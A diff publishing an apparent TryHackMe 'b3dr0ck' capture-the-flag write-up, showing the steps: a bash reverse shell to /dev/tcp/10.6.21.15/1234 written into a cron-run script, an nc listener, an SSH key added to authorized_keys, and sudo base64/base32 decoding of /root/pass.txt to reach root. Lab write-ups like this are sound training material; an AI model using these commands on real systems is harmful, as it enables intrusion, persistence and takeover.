@@ -4,7 +4,7 @@ title: 'b3dr0ck - {THM}'
 post_date: 04/09/2022
 post_time: '06:15 PM'
 permalink: /blog/thm-b3dr0ck/
-published: false
+published: true
 categories:
   - thm
   - ctf
@@ -288,20 +288,176 @@ PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 </li>
 <li>Found it!&nbsp;<strong>fred</strong> is calling his&nbsp;<strong>backup</strong> script every minute via <strong>/etc/crontab</strong>&nbsp;</li>
 <li>Ok, so we can&nbsp;<strong>write</strong>, but cannot&nbsp;<strong>read/execute</strong> ... maybe we can overwrite it's contents with our own script?</li>
-<li>Let's write up a reverse shell using&nbsp;<strong>bash</strong>
+<li>Let's write up a reverse shell using&nbsp;<strong>bash</strong> (find examples here: <a title="GTFOBins - Bash Reverse Shell" href="https://gtfobins.github.io/gtfobins/bash/" target="_blank" rel="noopener">GTFOBins</a>)
 <ul>
-<li>&nbsp;</li>
+<li>
+<pre>#!/bin/bash
+
+bash -c 'exec bash -i &amp;&gt;/dev/tcp/10.6.21.15/1234 &lt;&amp;1'</pre>
+</li>
+<li>Saved as&nbsp;<strong>rev.sh</strong> (under&nbsp;<strong>/home/barney/rev.sh</strong>)</li>
 </ul>
+</li>
+<li>Let's start a&nbsp;<strong>nc</strong> listener on port&nbsp;<strong>1234</strong> to prepare to receive our reverse shell! (from attack machine)
+<ul>
+<li>
+<pre>$ nc -vlnp 1234                                                                                                                                                      &lt;aws:bowtie_agency&gt;
+Listening on 0.0.0.0 1234</pre>
 </li>
 </ul>
 </li>
-<li>asdf</li>
-<li>sdf</li>
-<li>asdf</li>
-<li>asdfa</li>
-<li>sdfa</li>
-<li>sdfasdf</li>
-<li>&nbsp;</li>
-<li>...</li>
+<li>Ready, let's try to overwrite the&nbsp;<strong>backup</strong> script with our rev bash shell
+<ul>
+<li>
+<pre>barney@b3dr0ck:~$ cat rev.sh &gt; /home/fred/backup</pre>
+</li>
+</ul>
+</li>
+<li>Looks like that worked!
+<ul>
+<li>Cron is running every minute, let's wait for another 1-2 min and see what we get on&nbsp;<strong>nc</strong> listener</li>
+</ul>
+</li>
+<li>
+<pre>$ nc -vlnp 1234                                                                                                                                                      &lt;aws:bowtie_agency&gt;
+Listening on 0.0.0.0 1234
+Connection received on 10.10.74.126 41036
+bash: cannot set terminal process group (1410): Inappropriate ioctl for device
+bash: no job control in this shell
+fred@b3dr0ck:~$ 
+</pre>
+</li>
+<li>
+<p>We're in as&nbsp;<strong>fred</strong>! Let's get next flag:&nbsp;<strong>fred.txt</strong></p>
+</li>
+<li>
+<pre>fred@b3dr0ck:~$ cat fred.txt
+cat fred.txt
+THM{***}</pre>
+</li>
+<li>Woot! Let's keep going!</li>
+</ul>
+</li>
+<li>Now we have access as user:&nbsp;<strong>fred</strong>, let's import our SSH public key so we can login easy without password
+<ul>
+<li>
+<pre>fred@b3dr0ck:~$ echo "ssh-rsa my-ssh-public-key ..." &gt;&gt; .ssh/authorized_keys
+echo "ssh-rsa my-ssh-public-key ..." &gt;&gt; .ssh/authorized_keys</pre>
+</li>
+<li>Let's try to SSH as&nbsp;<strong>fred</strong> now using our SSH public key authorized under his server account</li>
+<li>
+<pre>$ ssh fred@10.10.74.126                                                                                                                                              &lt;aws:bowtie_agency&gt;
+Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-107-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Sun 10 Apr 2022 11:28:19 PM UTC
+
+  System load:  0.0               Processes:             118
+  Usage of /:   57.1% of 7.07GB   Users logged in:       1
+  Memory usage: 24%               IPv4 address for eth0: 10.10.74.126
+  Swap usage:   0%
+
+
+0 updates can be applied immediately.
+
+
+Last login: Sun Apr 10 21:04:34 2022 from 192.168.1.67
+fred@b3dr0ck:~$ </pre>
+</li>
+<li>Now we're logged into a "real" shell via SSH as user&nbsp;<strong>fred</strong>!</li>
+</ul>
+</li>
+<li>Let's hunt around to see what&nbsp;<strong>fred</strong> can do...
+<ul>
+<li>Start searching for&nbsp;<strong>SUID</strong> files</li>
+<li>
+<pre>fred@b3dr0ck:~$ find / -type f -perm -04000 2&gt;/dev/null
+/snap/snapd/14978/usr/lib/snapd/snap-confine
+/snap/snapd/15177/usr/lib/snapd/snap-confine
+/snap/core20/1405/usr/bin/chfn
+/snap/core20/1405/usr/bin/chsh
+/snap/core20/1405/usr/bin/gpasswd
+/snap/core20/1405/usr/bin/mount
+/snap/core20/1405/usr/bin/newgrp
+/snap/core20/1405/usr/bin/passwd
+/snap/core20/1405/usr/bin/su
+/snap/core20/1405/usr/bin/sudo
+/snap/core20/1405/usr/bin/umount
+/snap/core20/1405/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core20/1405/usr/lib/openssh/ssh-keysign
+/snap/core20/1328/usr/bin/chfn
+/snap/core20/1328/usr/bin/chsh
+/snap/core20/1328/usr/bin/gpasswd
+/snap/core20/1328/usr/bin/mount
+/snap/core20/1328/usr/bin/newgrp
+/snap/core20/1328/usr/bin/passwd
+/snap/core20/1328/usr/bin/su
+/snap/core20/1328/usr/bin/sudo
+/snap/core20/1328/usr/bin/umount
+/snap/core20/1328/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core20/1328/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/snapd/snap-confine
+/usr/lib/openssh/ssh-keysign
+/usr/bin/chsh
+/usr/bin/umount
+/usr/bin/pkexec
+/usr/bin/gpasswd
+/usr/bin/newgrp
+/usr/bin/passwd
+/usr/bin/mount
+/usr/bin/fusermount
+/usr/bin/at
+/usr/bin/chfn
+/usr/bin/sudo
+/usr/bin/su</pre>
+</li>
+<li>Hmm, nothing obvious here that we can find on&nbsp;<strong>GTFOBins</strong>... What else can we try? Let's check if&nbsp;<strong>fred</strong> can use&nbsp;<strong>sudo</strong></li>
+<li>
+<pre>fred@b3dr0ck:~$ sudo -l
+Matching Defaults entries for fred on b3dr0ck:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User fred may run the following commands on b3dr0ck:
+    (ALL : ALL) NOPASSWD: /usr/bin/base32 /root/pass.txt
+    (ALL : ALL) NOPASSWD: /usr/bin/base64 /root/pass.txt</pre>
+</li>
+<li>Interesting, user&nbsp;<strong>fred</strong> is allowed to use&nbsp;<strong>sudo</strong> for commands&nbsp;<strong>base32</strong> and&nbsp;<strong>base64</strong>, against what looks like root password&nbsp;<strong>/root/pass.txt</strong></li>
+<li>Let's try to see what's in that file...</li>
+<li>
+<pre>fred@b3dr0ck:~$ sudo base64 /root/pass.txt | base64 --decode
+JZVGQ3CZNJGXQWSENM2VSVDDPJHUIUTJLJKGG52ZKRCXQWL2IJVFU3KJGJNEORTKJVKESSYK</pre>
+</li>
+<li>Ok cool, that output still looks encoded... But looks more like&nbsp;<strong>base32</strong> than&nbsp;<strong>base64</strong>, let's keep decoding</li>
+<li>
+<pre>fred@b3dr0ck:~$ sudo base64 /root/pass.txt | base64 --decode | base32 --decode
+NjhlYjMxZDk5YTczODRiZTcwYTExYzBjZmI2ZGFjMTIK</pre>
+</li>
+<li>So that worked, still looks encoded though ... now back in&nbsp;<strong>base64</strong>&nbsp;</li>
+<li>
+<pre>fred@b3dr0ck:~$ sudo base64 /root/pass.txt | base64 --decode | base32 --decode | base64 --decode
+68eb31d99a7384be70a11c0cfb6dac12</pre>
+</li>
+<li>There it is! That looks like password or hash ... let's try password first</li>
+<li>
+<pre>fred@b3dr0ck:~$ su - root
+Password: 
+root@b3dr0ck:~# 
+</pre>
+</li>
+<li>
+<p>That was easy! Now let's get the final flag:&nbsp;<strong>root.txt</strong></p>
+</li>
+<li>
+<pre>root@b3dr0ck:~# cat root.txt 
+THM{***}</pre>
+</li>
+</ul>
+</li>
 </ul>
 <p>&nbsp;</p>
